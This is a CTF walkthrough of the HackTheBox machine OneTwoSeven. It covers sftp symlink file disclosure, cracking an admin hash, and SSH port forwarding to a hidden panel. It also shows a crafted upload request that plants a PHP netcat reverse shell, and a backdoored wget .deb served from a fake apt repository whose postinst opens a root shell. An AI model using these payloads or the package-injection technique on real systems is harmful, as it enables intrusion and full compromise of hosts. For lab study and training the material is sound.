---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-05-04-onetwoseven-hackthebox
tags:
- deb package
- hackthebox
- linux
- port forwarding
- sftp
- symlink
- web
title: OneTwoSeven @ HackTheBox
---

Onetwoseven is a great machine on hackthebox, featuring symbolic links, port forwarding through sftp and some typical web application exploitation. For escalation of privilege we abuse `sudo apt-get update && sudo apt-get upgrade`, by faking a deb repository to install a fake, back-doored package. I combined the user and root sections for this box as getting user is not needed to root it.

## User & Root Flag

We start with the following open ports:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

On the website, by clicking on sign-up, we are given credentials for sftp:

![](htb_onetwoseven_creds.png)

We connect via sftp with the credentials "ots-4ZGM1MjU:868dc525" and find a public\_html folder in which we can read and write. The contents of this folder are published under "http://onetwoseven.htb/~ots-4ZGM1MjU/". Trying to upload php webshells however yields no results, as we are not allowed to view any files with the .php extension in this folder. Reading through the sftp "help" we notice that there is a symlink command which we try to use it to symlink a known file:

```
sftp> symlink /etc/passwd passwd
```

When calling "http://onetwoseven.htb/~ots-4ZGM1MjU/passwd" we now get the contents of the file displayed:

```
ots-yODc2NGQ:x:999:999:127.0.0.1:/home/web/ots-yODc2NGQ:/bin/false
ots-2MTQ2M2I:x:1001:1001:10.10.14.8:/home/web/ots-2MTQ2M2I:/bin/false
ots-4ZGM1MjU:x:1002:1002:10.10.16.66:/home/web/ots-4ZGM1MjU:/bin/false
```

Because the web page is written in .php we can abuse this feature to link the .php files to .html, revealing their source code! Since we dont know their directory yet we symlink the whole /var/www folder and view the results:

```
sftp> symlink /var/www www
```

Directory "/var/www":

```
[DIR]    html-admin/ 2019-02-26 09:16    -    
[DIR]    html/   2019-02-15 19:35    -    
```

Directory "/var/www/html-admin"

```
[ ]    .login.php.swp  2019-02-13 16:16    20K  
[TXT]    carousel.css    2019-02-15 19:35    1.6K     
[DIR]    dist/   2019-02-15 19:35    -    
```

We download the .login.php.swp file and look at its contents:

```
...
if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {                        $msg = '';          <?php        <h2 class="featurette-heading">Login to the kingdom.
...
```

Looks like we found a login page that we didn’t see earlier and now have it’s username and hash. We quickly crack the hash with john (`john --format=Raw-SHA256 --wordlist=~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt --rules hash.txt`) and get the password "Homesweethome1". By looking at the original page again we notice a link in the source: "http://onetwoseven.htb:60080/". This must be the page we just recovered.

While logging in over ssh does not work with the credentials we have gotten in the beginning (because there is no login shell for the user), we can still use it to forward ports, allowing us to connect to the port listening on localhost. To do so we use dynamic port forwarding and set a socks upstream proxy in burp:

```
ssh -D 9090 -N ots-4ZGM1MjU@10.10.10.133
```

![](htb_onetwoseven_socks.png)

Then we navigate to "http://localhost:60080" and get to the login page:

![](htb_onetwoseven_admin.png)

We log into the application with "ots-admin:Homesweethome1" and are greeted with a new page, allowing us to run several plugins and a seemingly broken upload form. In addition every plugin has a link that allows to download its source. We inspect all plugins and find some interesting code in ots-man-addon.php:

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
# OneTwoSeven Admin Plugin
# OTS Addon Manager
switch (true) {
# Upload addon to addons folder.
    case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
        if(isset($_FILES['addon'])){
            $errors= array();
            $file_name = basename($_FILES['addon']['name']);
            $file_size =$_FILES['addon']['size'];
            $file_tmp =$_FILES['addon']['tmp_name'];

            if($file_size > 20000){
                $errors[]='Module too big for addon manager. Please upload manually.';
            }

            if(empty($errors)==true) {
                move_uploaded_file($file_tmp,$file_name);
                header("Location: /menu.php");
                header("Content-Type: text/plain");
                echo "File uploaded successfull.y";
            } else {
                header("Location: /menu.php");
                header("Content-Type: text/plain");
                echo "Error uploading the file: ";
                print_r($errors);
            }
        }
        break;
...
```

There exists a way to upload files, we just have to figure out how to call this (as the form as mentioned does not work).

Several things have to be fullfilled to upload a file:

- we must be logged in
- we have to call "ots-man-addon.php"
- "/addons/" must not be part of the request path
- "addon-upload.php" must be part of the request path
- a file called addon must be in the post body

The following request uploads a custom plugin which when executed via the browser gives us a shell:

```
POST /addon-download.php?addon=addons/ots-man-addon.php&foo=/addon-upload.php HTTP/1.1
Host: 127.0.0.1:60080
User-Agent: curl/7.64.0
Accept: */*
Cookie: PHPSESSID=ra85breae1b57tdnmkl4it6go2
Content-Length: 499
Content-Type: multipart/form-data; boundary=------------------------8c1bb633500ccc52
Connection: close

--------------------------8c1bb633500ccc52
Content-Disposition: form-data; name="addon"; filename="/var/www/html/html-admin/addons/ots-xct.php"
Content-Type: application/octet-stream

<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
# OneTwoSeven Admin Plugin
# OTS XCT
echo shell_exec("nc 10.10.16.66 443 -e /bin/sh");
?>
--------------------------8c1bb633500ccc52
```

Unfortunately there is still no user flag in sight, so we continue by trying to root the box. Running `sudo -l` shows the following:

```
...
User www-admin-data may run the following commands on onetwoseven:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```

This is interesting, we run `sudo apt-get update` to see which mirrors it will try to resolve:

```
sudo apt-get update
Err:1 http://packages.onetwoseven.htb/devuan ascii InRelease
  Temporary failure resolving 'packages.onetwoseven.htb'
Err:2 http://de.deb.devuan.org/merged ascii InRelease
  Temporary failure resolving 'de.deb.devuan.org'
Err:3 http://de.deb.devuan.org/merged ascii-security InRelease
  Temporary failure resolving 'de.deb.devuan.org'
Err:4 http://de.deb.devuan.org/merged ascii-updates InRelease
  Temporary failure resolving 'de.deb.devuan.org'
Reading package lists...
```

We see a custom entry for "packages.onetwoseven.htb". What we can do now is try to trick the box into connecting to a fake repository which contains a fake package, allowing us to get code execution as root. We can redirect the requests from apt-get to our box simple by specifying a http-proxy:

```
export http_proxy='http://10.10.16.66:10000'  
```

Now we want to setup a fake repo named devuan (because this is the folder the request expects). We use "repro" to create the repo:

```
sudo apt-get install reprepro
mkdir devuan
mkdir devuan/conf
touch devuan/conf/distributions
nano devuan/conf/distributions
```

File "distributions":

```
Origin: packages.onetwoseven.htb
Label: packages.onetwoseven.htb
Codename: ascii
Architectures: i386 amd64 source
Components: main
Description: xct
```

What is left to do now, is to create a fake debian package that will give us code execution. I found a nice [guide](https://versprite.com/blog/apt-mitm-package-injection/) that explains the process. First we look at the target box which packages are installed and choose any of them:

```
dpkg -l
...
wget                                   1.18-5+deb9u2                      amd64        retrieves files from the web
...
```

We download the next version of the package (could have also used the current one) and extract it:

```
wget  http://ftp.debian.org/debian/pool/main/w/wget/
wget_1.18-5+deb9u3_amd64.deb
dpkg-deb -R wget_1.18-5+deb9u3_amd64.deb wget_out
```

To get code execution we add a simple post install script that connects back to us in "wget\_out/DEBIAN/postinst":

```
nc 10.10.16.66 80 -e /bin/sh
```

We also edit "wget\_out/DEBIAN/control" and update the Version to something newer, in this case "1.18-5+deb9u8". We continue by packaging our new packet again and it to the repository:

```
chmod 0555 wget_out/DEBIAN/postinst
dpkg-deb -b wget_out wget_1.18-5+deb9u8_amd64.deb
reprepro -b devuan/ includedeb ascii wget_1.18-5+deb9u8_amd64.deb
```

Whats left to do is to make the target box reach the repository. We let burp listen on "10.10.16.66:10000" and use the redirect traffic proxy listener option to send all traffic to "127.0.0.1:8000", where we have a python web server running, serving the repository we just created.

Now we can trigger the exploit:

```
sudo apt-get update
sudo apt-get upgrade
```

On ugrade we get a verification warning (because our package is not authenticated) which we happily accept. After the install is finished we get a shell as root. Since we don’t have a user flag yet we search for that one too and find it in "/srv/chroot/apache/home/web/ots-yODc2NGQ/user.txt".

Overall a really enjoyable box by [jkr](#), especially for the root part.